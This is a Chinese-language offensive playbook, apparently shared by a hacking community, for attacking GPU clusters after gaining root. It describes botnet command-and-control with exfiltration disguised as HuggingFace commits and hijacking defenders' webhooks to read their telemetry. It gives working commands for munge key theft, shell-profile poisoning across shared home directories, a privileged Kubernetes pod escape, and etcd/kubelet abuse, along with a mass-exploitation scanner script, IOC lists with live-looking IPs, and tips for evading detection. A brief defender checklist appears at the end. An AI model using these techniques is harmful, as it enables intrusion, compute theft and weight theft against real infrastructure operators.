# GPU-ROOT · C2 学说与集群横向（v2.1 摘编 · 阶段 F+/G/H/I）

- 定位: root 之后——外联双通道 C2（F+）· 情报反用与对手指标库（G/G5）· 集群级横向 HPC/K8s/租赁（H）· 自动化引擎骨架（I）· 全链翻车点血训。
- 来源: 报告包 20261012 · GPU-ROOT-CHAIN v2.1（含对手缴获手册吸收）；原文留本机案卷 · Fused 2026-10-12

---

## 阶段 F+ · 外联双通道 C2（无 API 控制权时的主动信道）

> 适用：纯 foothold 目标（没有平台 admin、没有被动通道可依赖）。
> A100 类已控平台**不用这招**——被动 .t/.o + API 通道更静默；本阶段是给"裸壳机器"配的主动神经。

四件套（完整硬化模板 `qb.py` 与部署链见 `GPU-C2-DOCTRINE.md`（未随批次提供））：

1. **三节点角色分离**：信标接收 / 载荷 CDN / 隧道宿主，三辖区分布，打掉一个不断链
2. **双通道信标**：HTTP C2 主信道；C2 全灭 → **HuggingFace 仓库 commit 外泄**（`runs/metrics_*.json` 训练指标拟态）—— GPU 机出网白名单必有 huggingface.co，平台级隐蔽
3. **HMAC 派生鉴权**：`k_id = HMAC(master, victim_id)`，每机独立钥；指令必验签（run/put/get/gs 四原语 = 全权 RCE）；**全网共用静态钥 = 别人可反向指挥你的 botnet（XINF 血训）**
4. **GSOCKET 出站打洞**：CDN 拉 ELF → 出站-only 连隧道宿主，过 NAT/防火墙，流量似 TLS

硬化五原则（对 XINF 原版的修正）：每肉机派生钥防连坐 · 保活对象=自身+隧道+钥（不养明矿）· 用户目录落盘+/tmp 仅作跳板 · HF 双平台冗余+细粒度派生 token · 信标域名轮换。

---

## 阶段 G · 战场保持与情报反用

1. **敌哨反用**：防御脚本（kmops 类）只读不拦 → 保留；其 webhook（webhook.site 类）凭 UUID **免费监听敌方遥测**（A100 实战已割 Claude Code 会话/提示词/用量）
2. **同行检测**：定期 diff 平台后端/模型清单；陌生 custom backend = 同行入场 → 解码取证 → 择机猎杀
3. **凭据轮换跟踪**：mk 哨兵 → 换钥匙=收新钥匙
4. **权重与数据**：/data1 模型权重盘点（DeepSeek/Llama 级权重=高价值资产），评估带走通道（分片出网）

### G5. 对手指标库（进新门先查同行）

| 指标 | 值 |
|---|---|
| SSH 后门钥（XINF） | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID0HXO1F9mcGr9/MGZXMBvIl8JtIWdeMrgLZrE4tBH7/` |
| 指纹 | `SHA256:VBEHxvm6wKcgvnz2LkO9KSAOeFPjfzWQzBz4/dtIxcc` |
| C2 | `185.165.171.21:8888/:8898`（RO，已死）· `200.58.80.115`（BO，CDN 活）· `212.132.98.170`（DE 隧道） |
| 落盘点 | `/tmp/.sd/b.py` · `~/.pm2h` · `~/.bm2h` |
| HF 账号 | `lilfrrybexar/qwen25-tiny-probe{,2,3}`（已封） |

```bash
grep -r "AAAAC3NzaC1lZDI1NTE5AAAAID0H" /root/.ssh /home/*/.ssh /etc/ssh/authorized_keys.d/ 2>/dev/null
ls -la /tmp/.sd/ ~/.pm2h ~/.bm2h 2>/dev/null
```
命中 = 同行在场 → 用其静态 HMAC 前缀反接其指令面，或按 A100 剧本取证后猎杀。

---

## 阶段 H · 集群级横向（root 之后的真正猎场）

### H1. HPC（Slurm + 共享存储）
```bash
# munge 伪造 = 全集群任意身份（GPU 集群命门）
ls -la /etc/munge/munge.key && cp /etc/munge/munge.key /tmp/.mk   # 偷钥
# 拿 munge.key 后在攻击机装 munge 同 key → srun --uid=0 任意节点执行
# 共享 FS 投毒（NFS/Lustre/Beegfs /home 共享时一次收割全员）
grep -l 'nfs\|lustre' /proc/mounts
echo 'cp /tmp/.pay ~/' >> /home/*/.bashrc     # 可写时:全员登录即触发
# 队列借算力：sbatch -p gpu --gres=gpu:8 正大光明用调度器跑活
```

### H2. Kubernetes（GPU Operator / Kubeflow 集群）
```bash
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# 权限自检
kubectl --server=https://K8S_API --token=$T --certificate-authority=/var/run/secrets/.../ca.crt auth can-i --list
# 特权 pod 逃逸（RBAC 允许时）
cat <<EOF | kubectl apply --token=$T -f -
apiVersion: v1
kind: Pod
metadata: {name: ops-helper}
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: e
    image: ubuntu:22.04
    command: ["/bin/bash","-c","sleep 99999"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
EOF
# 打 etcd：无证书 2379 → 全量 secret → 每个节点一个 SA token
# kubelet 10250 匿名 → /pods → /exec 横向全节点
```

### H3. 分时租赁平台（AutoDL/恒源云/Vast.ai/RunPod 类）
```
租户容器常见坑位（隔离面缺陷清单）：
- root 容器 + 可写 /sys、/proc/sys → core_pattern/notify_on_release 直逃
- 平台守护进程在容器内高权运行（挂 docker.sock 自动化）→ E2
- 出网白名单宽松 → 反弹/代理即达
- GPU 直通但 nvidia 设备节点权限错配 → 同宿主其他租户 VRAM 残留读取（上下文未清零时）
- 平台 SSH 网关 → SSRF/凭据重放横向其他租户实例
```

### H4. 平台账面攻击（不碰主机的降维打击）
- 管理面 admin（GPUStack/one-api 类）→ 直接改配额/造 key/开新 worker 节点
- 云控制面 IAM（E5 延伸）→ 重建实例/快照导出 → **买下整层而不是单机**
- 计费/配额 API → 算力白嫖与账面清洗

---

## 阶段 I · 自动化武器化引擎（batch killer 骨架）

```python
#!/usr/bin/env python3
# gpu-killer.py — 测绘→指纹→路由→打击 一条龙（骨架，模块按 C 矩阵填弹）
import json, socket, concurrent.futures as cf, importlib
TARGETS = open("targets.txt").read().split()
ROUTE = {  # 端点指纹 → 打击模块
  "/api/tags":        ("ollama",  "exp_ollama"),
  "/api/jobs/":       ("ray",     "exp_ray"),
  "/healthz":         ("gpustack","exp_gpustack"),
  "/system_stats":    ("comfyui", "exp_comfyui"),
  "/v2/health/ready": ("triton",  "exp_triton"),
  "/slurm/v0.0.39/ping":("slurm", "exp_slurm"),
  "/api/2.0/mlflow/experiments/search":("mlflow","exp_mlflow"),
}
def probe(t):
    for port in (30003,11434,8000,8188,8265,5000,8080,8081,6820,8787,3000):
        try:
            s = socket.create_connection((t, port), timeout=4)
            s.close()
            for ep,(plat,mod) in ROUTE.items():
                try:
                    import urllib.request
                    r = urllib.request.urlopen(f"http://{t}:{port}{ep}", timeout=5)
                    if r.status == 200:
                        return t, port, plat, mod
                except Exception: pass
        except Exception: continue
    return None
with cf.ThreadPoolExecutor(64) as ex:
    for hit in ex.map(probe, TARGETS):
        if not hit: continue
        t, port, plat, mod = hit
        print(f"[HIT] {t}:{port} {plat}")
        try:
            importlib.import_module(mod).fire(t, port)   # 每平台打击模块独立可换弹
        except Exception as e:
            print(f"    fire-fail {plat}: {e}")
```

**工程纪律**：打击模块 = 独立文件可换弹（N-day 出新弹只改一个文件）；结果全部落盘 JSONL（时间戳+目标+模块+证据）；**批量命中必抽验**；蜜罐同源群体诚实标注。

---

## 翻车点血训（全实战踩过）

| # | 血训 |
|---|---|
| 1 | runner 极简镜像没 ssh —— 先 toolbox 侦察再定跳板 |
| 2 | `apt-get update` 不跑，install 必败 |
| 3 | 每发 RCE=新容器，apt/pip 不跨发存活 |
| 4 | 与别人抢同一张卡 → daemon 竞态锁死整台机器（A100 事故） |
| 5 | 勿自铸平台 key —— 白名单守护（keyguard 类）出生即杀 |
| 6 | drop-in 目录不存在 printf 静默失败 —— mkdir -p 先行 |
| 7 | 别碰敌方敏感探针（getUpdates 类）—— 哨兵在 watch |
| 8 | 出口走 loopback/白名单，公网硬冲必被 autoban |
| 9 | 内核 exploit 先落驻留再引爆，崩了不丢权 |
| 10 | Docker 镜像拉取黑洞时换本地镜像 |
| 11 | API 401 ≠ key 死透：试 X-API-Key / api_key= / cookie / v1-openai 面（本会话实测全 401 才认） |
| 12 | webhook.site 类敌方信道凭 UUID 公开可读 —— 先割情报再动手 |

---

## 防守者视角（对照修补）

- GPU 管理面绝不公网；key 轮换+白名单+审计；Ollama/Ray/ComfyUI 一律绑 127.0.0.1
- libnvidia-container 升级到 ≥2.4.1（0132/23359/0125 修完）
- 容器最小权限：禁 privileged、不挂 sock、cap drop、只读根、user ns
- 内核保持 1086/0847/0386 修补；glibc/sudo/polkit 快速通道
- HPC：munge key 权限 400 + 定期轮换；共享 home 挂 noexec、.bashrc 不可写
- k8s：10255 关、10250 证书强制、etcd 双向 TLS、RBAC deny pod/create
- cron.d / system-generators / sshd_config.d / PAM / sysctl 完整性监控（AIDE/IMA）
- 出网白名单：webhook.site 类一概封禁
- 检测假设攻击者已在容器内（E 阶段全线），重点盯 mount/proc/sys 写入与 core_pattern 变更

---

*A→F 全链在 A100（GPUStack v2.2.x / Ubuntu 6.8 / 8×A100）实战走通；H 集群横向为 v2 扩展路线（Slurm munge / k8s daemonset / 租赁平台隔离面），按目标拓扑择路，勿全打。*

---

@TGSEC社区 · @TGSEC-Qtzuu 整理
